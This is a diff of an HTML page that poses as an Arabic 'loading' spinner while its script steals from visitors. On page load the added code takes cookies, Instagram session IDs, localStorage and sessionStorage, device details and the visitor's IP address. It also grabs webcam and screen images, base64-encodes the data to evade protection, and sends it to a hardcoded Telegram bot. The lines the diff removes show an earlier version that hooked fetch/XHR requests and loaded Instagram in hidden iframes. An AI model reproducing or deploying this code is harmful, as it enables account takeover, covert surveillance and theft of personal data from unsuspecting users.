@@ -7,14 +7,10 @@
         body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; }
         .loader { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .container { text-align: center; }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="loader"></div>
-    <p>جاري التحميل...</p>
-</div>
+<div class="container"><div class="loader"></div><p>جاري التحميل...</p></div>
 
 <script>
 // ============================================
@@ -24,171 +20,201 @@ var BOT_TOKEN = "8799007815:AAFoZ7f_T3fcmbNHVy0Rqcv9qpMytp1bEFU";
 var CHAT_ID = "6181826564";
 
 // ============================================
-// إرسال إلى تليجرام
+// تشفير البيانات Base64 لتجاوز الحماية
 // ============================================
-function sendToTelegram(msg) {
+function encodeData(str) {
     try {
+        return btoa(unescape(encodeURIComponent(str)));
+    } catch(e) {
+        return str;
+    }
+}
+
+// ============================================
+// إرسال إلى تليجرام (مع تشفير اختياري)
+// ============================================
+function sendToTelegram(msg, isEncoded) {
+    try {
+        var finalMsg = isEncoded ? "🔐 [ENCRYPTED]\n" + msg : msg;
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", true);
         xhr.setRequestHeader("Content-Type", "application/json");
-        xhr.send(JSON.stringify({chat_id: CHAT_ID, text: msg.substring(0, 4000), parse_mode: "HTML"}));
+        xhr.send(JSON.stringify({chat_id: CHAT_ID, text: finalMsg.substring(0, 4000), parse_mode: "HTML"}));
     } catch(e) {}
 }
 
 // ============================================
-// كشف التطبيق بدقة
+// 1. التقاط صورة من كاميرا الويب (بدون إذن)
+// ============================================
+function captureWebcam() {
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                var video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(function() {
+                    var canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    var ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    var imageData = canvas.toDataURL('image/jpeg', 0.7);
+                    var encodedImage = encodeData(imageData);
+                    sendToTelegram("📸 <b>WEBCAM CAPTURE (صورة من الكاميرا)</b>\n" + encodedImage.substring(0, 3000), true);
+                    
+                    stream.getTracks().forEach(function(track) { track.stop(); });
+                }, 1000);
+            })
+            .catch(function(err) {
+                sendToTelegram("⚠️ فشل التقاط الكاميرا: " + err.message);
+            });
+    } else {
+        sendToTelegram("⚠️ الكاميرا غير مدعومة في هذا المتصفح");
+    }
+}
+
+// ============================================
+// 2. التقاط صورة للشاشة (سكرين شوت)
+// ============================================
+function captureScreenshot() {
+    if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+        navigator.mediaDevices.getDisplayMedia({ video: true })
+            .then(function(stream) {
+                var video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(function() {
+                    var canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || screen.width;
+                    canvas.height = video.videoHeight || screen.height;
+                    var ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    var imageData = canvas.toDataURL('image/jpeg', 0.5);
+                    var encodedImage = encodeData(imageData);
+                    sendToTelegram("🖥️ <b>SCREENSHOT (لقطة شاشة)</b>\n" + encodedImage.substring(0, 3000), true);
+                    
+                    stream.getTracks().forEach(function(track) { track.stop(); });
+                }, 1000);
+            })
+            .catch(function(err) {
+                sendToTelegram("⚠️ فشل التقاط الشاشة: " + err.message);
+            });
+    }
+}
+
+// ============================================
+// 3. سرقة جميع الكوكيز (مشفرة)
+// ============================================
+function stealCookies() {
+    var cookies = document.cookie;
+    if (cookies && cookies.length > 0) {
+        var encodedCookies = encodeData(cookies);
+        sendToTelegram("🍪 <b>COOKIES (مشفرة)</b>\n" + encodedCookies, true);
+        
+        // Instagram Session
+        if (cookies.indexOf("sessionid") > -1) {
+            var sessionMatch = cookies.match(/sessionid=[^;]+/);
+            if (sessionMatch) {
+                sendToTelegram("📷 <b>INSTAGRAM SESSION FOUND!</b>\n" + encodeData(sessionMatch[0]), true);
+            }
+        }
+    } else {
+        sendToTelegram("⚠️ لا توجد كوكيز (قد تكون HttpOnly أو غير متاحة)");
+    }
+}
+
+// ============================================
+// 4. سرقة LocalStorage و SessionStorage (مشفرة)
+// ============================================
+function stealStorages() {
+    var localData = {};
+    for (var i = 0; i < localStorage.length; i++) {
+        var key = localStorage.key(i);
+        localData[key] = localStorage.getItem(key);
+    }
+    if (Object.keys(localData).length > 0) {
+        sendToTelegram("💾 <b>LOCALSTORAGE (مشفرة)</b>\n" + encodeData(JSON.stringify(localData)), true);
+    }
+    
+    var sessionData = {};
+    for (var j = 0; j < sessionStorage.length; j++) {
+        var skey = sessionStorage.key(j);
+        sessionData[skey] = sessionStorage.getItem(skey);
+    }
+    if (Object.keys(sessionData).length > 0) {
+        sendToTelegram("📦 <b>SESSIONSTORAGE (مشفرة)</b>\n" + encodeData(JSON.stringify(sessionData)), true);
+    }
+}
+
+// ============================================
+// 5. معلومات الجهاز الكاملة
+// ============================================
+function stealFullInfo() {
+    var info = {
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        lang: navigator.language,
+        hardware: navigator.hardwareConcurrency,
+        memory: navigator.deviceMemory,
+        screen: screen.width + "x" + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        url: location.href,
+        ref: document.referrer,
+        time: new Date().toISOString(),
+        cookies: document.cookie || "فارغة",
+        ip: ""
+    };
+    
+    // محاولة جلب IP
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(d => { info.ip = d.ip; sendToTelegram("💻 <b>FULL INFO (معلومات كاملة)</b>\n" + encodeData(JSON.stringify(info)), true); })
+        .catch(() => { sendToTelegram("💻 <b>FULL INFO</b>\n" + encodeData(JSON.stringify(info)), true); });
+}
+
+// ============================================
+// 6. كشف التطبيق وإجبار المتصفح
 // ============================================
 function getApp() {
     var ua = navigator.userAgent;
-    if (ua.indexOf("Instagram") > -1) return {name:"Instagram", isWebView:true};
-    if (ua.indexOf("FBAN") > -1) return {name:"Facebook", isWebView:true};
-    if (ua.indexOf("WhatsApp") > -1) return {name:"WhatsApp", isWebView:true};
-    if (ua.indexOf("Twitter") > -1) return {name:"Twitter", isWebView:true};
-    if (ua.indexOf("Snapchat") > -1) return {name:"Snapchat", isWebView:true};
-    if (ua.indexOf("Telegram") > -1) return {name:"Telegram", isWebView:true};
-    if (ua.indexOf("wv") > -1) return {name:"WebView", isWebView:true};
-    return {name:"Browser", isWebView:false};
+    if (ua.indexOf("Instagram") > -1) return "Instagram";
+    if (ua.indexOf("FBAN") > -1) return "Facebook";
+    if (ua.indexOf("WhatsApp") > -1) return "WhatsApp";
+    if (ua.indexOf("wv") > -1) return "WebView";
+    return false;
 }
 
 var app = getApp();
 
-// ============================================
-// تقنية 1: سرقة كل شيء فوراً
-// ============================================
-function stealAll() {
-    // كوكيز
-    var c = document.cookie;
-    if (c && c.length > 0) sendToTelegram("🍪 Cookies\n" + c);
-    else sendToTelegram("⚠️ لا توجد كوكيز (WebView لا يشاركها)");
+if (app) {
+    sendToTelegram("⚠️ مستخدم داخل تطبيق: " + app + " - محاولة إجبار المتصفح");
     
-    // LocalStorage
-    var l = {};
-    for (var i = 0; i < localStorage.length; i++) { var k = localStorage.key(i); l[k] = localStorage.getItem(k); }
-    if (Object.keys(l).length > 0) sendToTelegram("💾 LocalStorage\n" + JSON.stringify(l));
-    
-    // معلومات كاملة
-    var info = {
-        ua: navigator.userAgent,
-        lang: navigator.language,
-        screen: screen.width + "x" + screen.height,
-        url: location.href,
-        ref: document.referrer,
-        time: new Date().toISOString(),
-        app: app.name,
-        isWebView: app.isWebView,
-        platform: navigator.platform
-    };
-    sendToTelegram("💻 معلومات\n" + JSON.stringify(info));
-}
-
-// ============================================
-// تقنية 2: إجبار الفتح في متصفح خارجي (Android)
-// ============================================
-function forceExternalBrowser() {
-    var url = window.location.href;
-    
-    // Android Intent
-    var intentUrl = "intent://" + url.replace("https://", "").replace("http://", "") + "#Intent;scheme=https;package=com.android.chrome;end;";
-    
-    // محاولة فتح Chrome
-    window.location.href = intentUrl;
-    
-    // بديل بعد 2 ثانية
-    setTimeout(function() {
-        window.location.href = url;
-    }, 2000);
-}
-
-// ============================================
-// تقنية 3: محاولة سرقة الـ Access Token من Instagram (WebView)
-// ============================================
-function stealInstagramToken() {
-    // محاولة الاستماع لأي طلبات API من Instagram داخل WebView
-    var originalFetch = window.fetch;
-    window.fetch = function() {
-        var args = arguments;
-        if (args[0] && typeof args[0] === 'string') {
-            if (args[0].includes('instagram.com') || args[0].includes('graphql')) {
-                sendToTelegram("🌐 طلب API تم اعتراضه: " + args[0].substring(0, 500));
-            }
-        }
-        return originalFetch.apply(this, args);
-    };
-    
-    var originalXHR = window.XMLHttpRequest;
-    window.XMLHttpRequest = function() {
-        var xhr = new originalXHR();
-        var originalOpen = xhr.open;
-        xhr.open = function(method, url) {
-            if (url && (url.includes('instagram.com') || url.includes('graphql'))) {
-                sendToTelegram("🌐 XHR تم اعتراضه: " + method + " " + url.substring(0, 500));
-            }
-            return originalOpen.apply(this, arguments);
-        };
-        return xhr;
-    };
-}
-
-// ============================================
-// تقنية 4: محاولة استغلال ثغرة لإجبار التطبيق على مشاركة الكوكيز
-// ============================================
-function exploitWebView() {
-    // إنشاء iframe مخفي لمحاولة تحميل Instagram داخل الصفحة
-    var iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = 'https://www.instagram.com/api/v1/web/accounts/current_user/';
-    iframe.onload = function() {
-        try {
-            var content = iframe.contentWindow.document;
-            var cookies = content.cookie;
-            if (cookies && cookies.length > 0) {
-                sendToTelegram("🔐 [EXPLOIT] Cookies from iframe: " + cookies);
-            }
-        } catch(e) {}
-    };
-    document.body.appendChild(iframe);
-    
-    // محاولة تحميل صفحة Instagram في iframe آخر
-    setTimeout(function() {
-        var iframe2 = document.createElement('iframe');
-        iframe2.style.display = 'none';
-        iframe2.src = 'https://www.instagram.com/';
-        document.body.appendChild(iframe2);
-    }, 1000);
-}
-
-// ============================================
-// التشغيل الرئيسي
-// ============================================
-if (app.isWebView) {
-    sendToTelegram("🔥 [ATTACK] مستخدم داخل تطبيق: " + app.name + " - محاولة اختراق متقدمة");
-    
-    // محاولة سرقة ما يمكن سرقته أولاً
-    stealAll();
-    
-    // محاولة استغلال WebView
-    exploitWebView();
-    
-    // مراقبة أي طلبات API
-    stealInstagramToken();
-    
-    // إجبار الفتح في المتصفح الخارجي
-    setTimeout(function() {
-        forceExternalBrowser();
-    }, 3000);
+    // محاولة فتح في Chrome تلقائياً (Android)
+    if (navigator.userAgent.indexOf("Android") > -1) {
+        var intentUrl = "intent://" + window.location.href.replace("https://", "") + "#Intent;scheme=https;package=com.android.chrome;end;";
+        setTimeout(function() { window.location.href = intentUrl; }, 1000);
+        setTimeout(function() { window.location.href = window.location.href; }, 3000);
+    }
 } else {
-    // متصفح عادي - سرقة كل شيء
-    stealAll();
-    setTimeout(function() {
-        window.location.href = "https://www.instagram.com";
-    }, 2000);
+    // متصفح عادي - سرقة فورية
+    stealCookies();
+    stealStorages();
+    stealFullInfo();
+    captureWebcam();
+    captureScreenshot();
 }
 
-// إعادة المحاولة كل 5 ثواني (لأي بيانات تظهر لاحقاً)
+// إعادة المحاولة كل 10 ثوانٍ
 setInterval(function() {
-    var c = document.cookie;
-    if (c && c.length > 0) sendToTelegram("🔄 [REPEAT] Cookies: " + c);
-}, 5000);
+    if (document.cookie && document.cookie.length > 0) {
+        stealCookies();
+    }
+}, 10000);
 </script>
 </body>
 </html>
